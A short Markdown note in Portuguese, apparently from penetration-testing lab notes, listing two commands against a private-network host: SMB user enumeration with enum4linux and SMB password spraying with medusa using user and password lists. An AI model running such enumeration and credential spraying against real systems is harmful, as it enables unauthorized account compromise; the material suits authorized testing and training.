## Enumeração de Usuários SMB
```bash
enum4linux -U 192.168.56.101
```

## Password Spraying SMB
```bash
medusa -h 192.168.56.101 -U smb_users.txt -P common_passwords.txt -M smbnt -t 2 -T 3
```
